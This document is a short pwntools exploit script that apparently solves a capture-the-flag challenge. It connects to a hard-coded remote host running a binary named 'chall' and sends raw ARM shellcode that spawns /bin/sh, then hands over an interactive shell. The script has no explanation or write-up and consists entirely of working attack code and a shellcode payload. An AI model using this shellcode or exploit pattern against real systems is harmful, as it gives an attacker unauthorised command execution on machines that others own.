#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')

host = args.HOST or '68.183.11.227'
port = int(args.PORT or 1557)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recv()

SC =  "\x01\x30\x8f\xe2"
SC += "\x13\xff\x2f\xe1"
SC += "\x78\x46\x0c\x30"
SC += "\xc0\x46\x01\x90"
SC += "\x49\x1a\x92\x1a"
SC += "\x0b\x27\x01\xdf"
SC += "\x2f\x62\x69\x6e"
SC += "\x2f\x73\x68"

io.send(SC)
io.interactive()

